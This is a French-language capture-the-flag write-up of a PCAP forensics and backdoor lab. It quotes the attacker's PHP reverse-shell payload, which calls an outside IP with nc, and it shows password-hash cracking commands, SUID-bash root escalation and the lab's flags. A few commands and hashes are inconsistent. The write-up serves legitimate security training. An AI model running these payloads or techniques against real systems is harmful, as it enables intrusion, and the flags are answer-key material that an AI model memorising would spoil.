# Task 1 - Forensics - Aanlyse th PCAP

##What was the URL of the page they used to upload a reverse shell?

Dans un premier temps, télécharger le document et l'ouvrir avec Wireshark. 

On tombe sur plusieurs requêtes, et la première requête HTTP fait un GET sur l'adresse 192.168.170.159/developement/

Réponse 1 : **/developement/**

## What payload did the attacker use to gain access?

Comme on sait qu'il faut intéragir avec l'application web, on filtre les protocoles par **HTTP**

Ensuite, on remarque qu'une URL se nomme : **/development/upload.php**

Pour voir l'interrieur de la trame, on fait un clic droit > Follow > HTTP Stream 

On fait une recherche CTRL+F et comme on recherche un fichier, on notre **php**. Sur les premiers résultat on voit 
qu'il sagit bien d'un payload, et en regardant les suivants, on s'aperçoit que la requête du fichier est en clair : 

Réponse 2 : **<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>**

##What password did the attacker use to privesc?

On continue de chercher dans les trames du dessous et à un moment, on s'aperçoit du résultat d'une requête "/bin/s h: 0: can't acce ss tty; job cont rol turn ed off $".
A partir de ce moment, on comprends qu'il s'agit des commandes reçu d'un terminal, donc on analyse la trame : 
clic droit > Follow > TCP Stream et on voit toutes les commandes et résultat du terminal. 

Réponse 3 : **whenevernoteartinstant**

##How did the attacker establish persistence? 

On continue d'analyser la même tram et on comprend qu'il télécharge une backdoor ssh via github et qu'il 
l'execute : 

Réponse 4 : **https://github.com/NinjaJc01/ssh-backdoor**

## Using the fasttrack wordlist, how many of the system passwords were crackable?

On commence par créer un fichier avec les différents hash qu'on peut retrouver dans la tram TCP 
``` 
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.
```
Pour identifier le type de hash, on utilise un tool, HashId :

``` hashid -j '$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/' ```
l'option **-j** permet de dire que la recherche est pour le crackeur de mot de passe John The Ripper. 
Si on aurait voulu utiliser Hashcat, il aurait fallut remplacer **-j** par **-m**. 

on peut voir qu'il sagit du format

``` [+] SHA-512 Crypt [JtR Format: sha512crypt] ```

On peut donc exécuter la commande pour cracker les hash : 

```
john --wordlist=/usr/share/wordlists/fasttrack.txt --format=sha512crypt hash.txt 

secret12         (?)     
abcd123          (?)     
1qaz2wsx         (?)     
secuirty3        (?)
```
On obtient donc 4 mots de passes. 

Réponse 5 : **4**

# Task 2 Research - Analyse the code

## What's the default hash for the backdoor?

Pour comprendre comment fonctionne la backdoor, il faut se rendre sur le lien :

[GitHub][https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go]

Et dans les premières lignes on voit clairement le hash : 

Réponse 6 : **bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3**

## What's the hardcoded salt for the backdoor?

Quand on lit le fichier, on voit deux fonctions qui prennent en compte les mêmes paramètres : 
``` 
func verifyPass(hash, salt, password string) bool {
	resultHash := hashPassword(password, salt)
	return resultHash == hash
}

func hashPassword(password string, salt string) string {
	hash := sha512.Sum512([]byte(password + salt))
	return fmt.Sprintf("%x", hash)
}
```
Quand on descend tout ne bas du fichier, on retrouve une autre fonction qui reprend elle aussi les mêmes 
paramètre à une exception près. Le salt est encodé en dur : 

``` 
func passwordHandler(_ ssh.Context, password string) bool {
	return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
}
```
Réponse 7 : **1c362db832f3f864c8c2fe05f2002a05**

## What was the hash that the attacker used? - go back to the PCAP for this!

Quand on retourne sur la tram analysée on s'aperçoit que la personne utilise un paramètre **-a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed**

Dans la fonction (du fichier), il est écris que : **a** correspondait au hash de la backdoor 
``` flaggy.String(&hash, "a", "hash", "Hash for backdoor") ```
Donc la réponse se trouve après le **-a** de la commande effectuée par la personne. 

réponse 8 : **6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed**

## Crack the hash using rockyou and a cracking tool of your choice. What's the password

Du coup on prend le hash utilisé par l'attaquant : **6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654**

On y ajoute le salt à la fin séparé par deux points ":" : **6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05**

On va chercher à quel type de hash il correspond : 

```
hashid -m '6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05'

[+] SHA-512 [Hashcat Mode: 1700]

```
Comme on sait que le mot de passe est salé mais que le SHA-512 n'est lui, pas salé, on va rechercher le numéro 
du mode avec lequel la méthode de crytage SHA-512 est salé : 

```
hashcat -h | grep SHA-512

1710 | sha512($pass.$salt)                                        | Raw Hash salted and/or iterated
```
On constate que le mode 1710 contient le $pass.$salt exactement ce que l'on a. 

On a plus qu'à executer la commande pour cracker le hash : 

```
hashcat -m 1720 hash -a 0 /usr/share/wordlists/rockyou.txt

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
```
réponse 8 : **november16**

# Task 3 Attack - Get back in! 

[IP_VPN] : 10.18.94.166
[IP_MACHINE] : 10.10.111.223 

## The attacker defaced the website. What message did they leave as a heading?

Se rendre sur [IP_MACHINE], c'es écris en gros 

Réponse 9 : **H4ck3d by CooctusClan**

## Using the information you've found previously, hack your way back in!

Pas de réponse attendue

## What's the user flag?

On commence par faire un nmap 

```
sudo nmap [IP_MACHINE] -sS -sV

```
On voit que le port 2222 utilisé pour ssh mais aussi le port 22.
Dans la backdoor, on se souvient que le port 2222 est utilisé pour se conencter en ssh justement. 

Alors, on va exploiter ce port. On sait aussi que l'utilisateur auquel l'attaquant à voulu se connecté est **james** 
```
ssh -p 2222 james@[IP_MACHINE] 

```
On arrive alors sur le dossier "/host/james/ssh-backdoor"

On reviens sur le dossier de l'utilisateur et on voir un fichier nommé user.txt. 
```
james@overpass-production:/home/james/ssh-backdoor$ cd ..

james@overpass-production:/home/james$ ls

ssh-backdoor  user.txt  www

james@overpass-production:/home/james$ cat user.txt 

thm{d119b4fa8c497ddb0525f7ad200e6567}

```
Oh un flag ! 

Réponse 10 : **thm{d119b4fa8c497ddb0525f7ad200e6567}**

## What's the root flag?

L'indice nous dit : "L'attaquant a-t-il laissé un moyen rapide de revenir en mode root sans mot de passe ?"

Cet indice nous informe que l'attquant à laissé un moyen rapide de devenir root sans mot de passe. 

On va donc regarder tous les fichiers, mêmes ceux cachés et surtout quels sont leurs droits. 

On tombe donc sur un fichier nommé : **.suid_bash** qui a les droits suivants : 

```
james@overpass-production:/home/james$ ls -la
total 1136
drwxr-xr-x 7 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
-rw------- 1 james james      51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james    4096 Jul 21  2020 www
``` 
```-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash```

Intéressant, ce fichier éxécutable à les droits root, bah on va l'éxécuter alors : 

```
james@overpass-production:/home/james$ ./.suid_bash -p

.suid_bash-4.4# whoami

root

```
le paramètre *-p* permet de **garder les droits qui sont attribués à ce fichier**. 
Cela signifie que le l'utilisateur james peut utiliser le fichier .suid_bash en mode root, ce qui lui permet d'avoir les privilèges root 

Donc nous sommes root ! 

on a plus qu'à se rendre dans le dossier "/root" et d'ouvrir le fichier **root.txt** 
```
.suid_bash-4.4# cat /root/root.txt

thm{d53b2684f169360bb9606c333873144d}
```
Réponse 11 : **thm{d53b2684f169360bb9606c333873144d}**

[P0WN3D] 

